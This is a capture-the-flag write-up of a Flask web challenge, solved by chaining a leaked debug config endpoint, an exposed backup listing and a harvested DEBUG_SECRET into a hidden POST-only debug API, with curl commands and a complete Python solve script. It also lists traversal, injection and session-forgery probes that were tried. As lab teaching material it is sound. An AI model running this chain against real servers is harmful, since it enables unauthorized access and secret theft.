---
title: "The Debugger"
category: "Web"
tags: ["information-disclosure", "debug-endpoint", "http-method", "flask"]
solve_date: "2026-10-10T21:13:00+07:00"
language: "en"
points: 346
---

# The Debugger

**Flag:** `foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}`  
**Service:** `http://54.87.116.237:5002` — Flask behind gunicorn, branding itself "PixelShare"

## Challenge

> A startup has deployed a web application that allows users to manage their profiles and upload profile pictures. Everything seems to work perfectly, from login and profile management to the image gallery.
>
> But behind the polished interface, something has gone wrong. The developers may have left behind a debugging feature that was never meant to reach production.
>
> Your mission is to investigate the application, uncover its hidden development features, and follow the trail to retrieve the secret stored on the server.
>
> Hint: The application knows more about itself than it tells you.

## Analysis

Response headers give the stack: `Server: gunicorn`, `Vary: Cookie`, and HTML rendered from a Jinja template that shares one CSS block across pages. Routes reachable with GET:

```text
/            /login  /register  /logout  /profile  /gallery  /health
```

Two things stand out during the first pass:

- `/gallery` is a stub — `"Image upload and gallery browsing are coming soon. Check back later!"`. No endpoint accepts `multipart/form-data`, even though the statement describes picture upload.
- `/profile` takes `?id=` and returns the profile of any user by id.

The custom 500 page is the main source of data. With a logged-in session, a non-numeric `id` makes the view fail at `int()`:

```console
$ curl -s -b "session=<cookie of a logged-in account>" \
       "http://54.87.116.237:5002/profile?id=abc"
```

```text
File "/app/routes/profile.py", line 41, in profile
    user_id = int(request.args.get("id"))
ValueError: invalid literal for int() with base 10: 'abc'
File "/app/config/settings.py", line 17, in load_config
    # dev-only route, disabled by DEBUG_ROUTES_ENABLED flag in prod
    app.add_url_rule("/__debug__/config", view_func=debug_config)
File "/app/wsgi.py", line 9, in <module>
    from app.config.settings import load_config
...
Error id: 0xDEADC0DE
```

This page is authored by the challenge rather than a live traceback: the HTML length tracks the length of the submitted value (`abc` → 1872, `0` → 1871, `1'` → 1875) while the frame list never changes, and `int("0")` is valid, so the `ValueError` reported for `id=0` is not a real failure. The three frames are therefore deliberate breadcrumbs, and the second one names the debug route directly.

## Solution

**Step 1 — debug config.** The route revealed by the `settings.py` frame is reachable without authentication:

```console
$ curl -s http://54.87.116.237:5002/__debug__/config
{"backup":"/internal/backup","debug":true,"environment":"development","note":"This endpoint must be disabled before production deploy.","storage":"/var/www/uploads/"}
```

**Step 2 — backup directory.** The `backup` key points at a real directory listing, produced from `os.listdir`:

```console
$ curl -s http://54.87.116.237:5002/internal/backup
Index of /internal/backup
  .env.bak   config.old   notes.txt   users.json
```

**Step 3 — the secret.** `.env.bak` carries the key that is needed (`notes.txt` says "TODO: rotate DEBUG_SECRET after the hackathon demo"):

```ini
# accidentally committed development secrets
DEBUG_SECRET=f3a9c2e7b1d84f6aa9c3e7b2d81f4a6c
SMTP_HOST=localhost
```

**Step 4 — internal debug API.** This step does not follow from the breadcrumbs: `/api/internal/debug` appears in no response from the three steps above, so the contest hint (120 points) was used to specify a POST request carrying the secret in a JSON body.

```console
$ curl -s -X POST http://54.87.116.237:5002/api/internal/debug \
       -H "Content-Type: application/json" \
       --data '{"secret":"f3a9c2e7b1d84f6aa9c3e7b2d81f4a6c"}'
{"flag":"foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}","message":"Debug mode authenticated"}
```

The endpoint checks both the key name and the content type: `{"secret": ...}` returns 200, while `{"DEBUG_SECRET": ...}`, a form-encoded body, or the secret placed in a header all return 403.

## Approaches tested

- **GET-only enumeration.** 9,677 words × 3 prefixes (`/`, `/__debug__/`, `/internal/`) = 29,031 requests, 0 errors, returning only the 8 already-known endpoints. `GET /api/internal/debug` yields `405` with `Allow: OPTIONS, POST`: a route registered for POST only is invisible to a wordlist that issues GET, and the 405 is what actually marks the route's existence. The same filter separates two 404 classes — 207 bytes for an unregistered Flask route, 14 bytes for the static handler.
- **Path traversal.** `/internal/backup/%2e%2e/...` and double-encoded, `%c0%ae` and `....//` variants all return the 14-byte 404; `%2f` is turned into a 308 back to a relative path by `merge_slashes`, so a filename can never begin with `/`. Reading files outside the backup directory is blocked at the application layer.
- **Flask session forgery.** `DEBUG_SECRET` is not the `SECRET_KEY`: 7 key derivations and 99,839 wordlist candidates all produced `Signature ... does not match`. The session payload of a logged-in user contains only `{"user_id":N}`, including user id 1 — there is no privilege field to impersonate.
- **Injection elsewhere.** `?id=` passes through `int()`, the tested values did not expose SQL injection; 10 `OR`/comment payloads at `/login` all return `Invalid credentials.`; usernames are escaped, so no SSTI (the SSTI probe payloads other players registered as usernames, Jinja and ERB variants of the `7*7` expression, render literally).
- **Mass assignment at `/register`.** Adding `role`, `is_admin`, `developer`, `debug` or `staff` changes neither the session nor the rendered output.
- **Environment spoofing.** `X-Forwarded-For`, `X-Real-IP`, `Host`, `X-Forwarded-Host` and 13 debug-flag headers change no response at all.
- **User data.** `id=1..300` with a valid session, 0 errors, every bio at its default; `id>=700` returns 500, those probes did not retrieve records at the tested higher IDs.

Constraint drawn from the above: the breadcrumb chain only leads to `DEBUG_SECRET`, while the final step sits behind a POST-only route that default enumeration does not reach.

## Result

```text
foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}
```

The flag was read directly from the challenge service's response to `POST /api/internal/debug`. No submission response was recorded.

## Reproduce

Python 3 with `requests`, and the service must still be reachable. Save the Python block below as `solve_the_debugger.py` and run `python solve_the_debugger.py`. The script walks the whole chain: read the debug config, list the backup directory, extract `DEBUG_SECRET` from `.env.bak`, then POST to the internal debug API. The control lines show how 405 and 403 differ.

```python
import re
import requests

BASE = "http://54.87.116.237:5002"

# 1. leaked debug config, reachable without authentication
cfg = requests.get(BASE + "/__debug__/config", timeout=20)
print("[*] GET /__debug__/config ->", cfg.status_code)
print("   ", cfg.text)
backup_path = cfg.json()["backup"]

# 2. directory listing exposed by that config
listing = requests.get(BASE + backup_path, timeout=20)
files = re.findall(r'href="%s/([^"]+)"' % re.escape(backup_path), listing.text)
files = [f for f in files if f != "../"]
print("[*] GET %s -> %s, files: %s" % (backup_path, listing.status_code, files))

# 3. DEBUG_SECRET from .env.bak
env = requests.get(BASE + backup_path + "/.env.bak", timeout=20).text
secret = re.search(r"^DEBUG_SECRET=(\S+)$", env, re.M).group(1)
print("[*] DEBUG_SECRET =", secret)

# 4. the POST-only internal debug API returns the flag
r = requests.post(BASE + "/api/internal/debug", json={"secret": secret}, timeout=20)
print("[*] POST /api/internal/debug ->", r.status_code)
print("   ", r.text)

# controls
print("[*] GET on the same path ->", requests.get(BASE + "/api/internal/debug", timeout=20).status_code,
      "| Allow:", requests.get(BASE + "/api/internal/debug", timeout=20).headers.get("Allow"))
print("[*] wrong secret  ->", requests.post(BASE + "/api/internal/debug",
      json={"secret": "0" * 32}, timeout=20).status_code)
print("[*] wrong key name->", requests.post(BASE + "/api/internal/debug",
      json={"DEBUG_SECRET": secret}, timeout=20).status_code)
print("[*] form-encoded  ->", requests.post(BASE + "/api/internal/debug",
      data={"secret": secret}, timeout=20).status_code)
```

```text
[*] GET /__debug__/config -> 200
    {"backup":"/internal/backup","debug":true,"environment":"development","note":"This endpoint must be disabled before production deploy.","storage":"/var/www/uploads/"}

[*] GET /internal/backup -> 200, files: ['.env.bak', 'config.old', 'notes.txt', 'users.json']
[*] DEBUG_SECRET = f3a9c2e7b1d84f6aa9c3e7b2d81f4a6c
[*] POST /api/internal/debug -> 200
    {"flag":"foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}","message":"Debug mode authenticated"}

[*] GET on the same path -> 405 | Allow: OPTIONS, POST
[*] wrong secret  -> 403
[*] wrong key name-> 403
[*] form-encoded  -> 403
```

The flag was reproduced consistently across several runs and through two independent clients (`requests` and `curl`).
